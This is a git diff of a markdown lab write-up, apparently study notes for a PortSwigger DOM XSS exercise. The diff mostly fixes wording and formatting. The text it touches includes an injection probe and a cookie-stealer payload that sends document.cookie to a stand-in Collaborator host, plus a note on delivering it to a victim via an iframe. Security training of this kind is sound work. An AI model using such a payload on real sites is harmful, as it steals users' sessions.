@@ -163,7 +163,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![DOM-XSS doc write inside select](images/dom-xss-doc-write-inside-select.png)  
 
->Perform the a test using below payload to ***identify*** the injection into the modified GET request.  
+>Perform a test using below payload to ***identify*** the injection into the modified GET request, using `">` to escape.  
 
 ```html
 /product?productId=1&storeId=fuzzer"></select>fuzzer
@@ -171,7 +171,7 @@ git-cola --repo 0ad900ad039b4591c0a4f91b00a600e7.web-security-academy.net/
 
 ![get-dom-xss.png](images/get-dom-xss.png)  
 
->DOM XSS cookie stealer payload in a ```document.write``` sink using source ```location.search``` inside a ```<select>``` element. This can be send to victim via exploit server in ```<iframe>```. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.  
+>DOM XSS cookie stealer payload in a `document.write` sink using source `location.search` inside a `<select>` element. This can be send to victim via exploit server in `<iframe>`. To test the cookie stealer payload I again on my browser in console added a test POC cookie to test sending it to Collaborator.  
 
 ```html
 "></select><script>document.location='https://COLLABORATOR.com/?domxss='+document.cookie</script>//
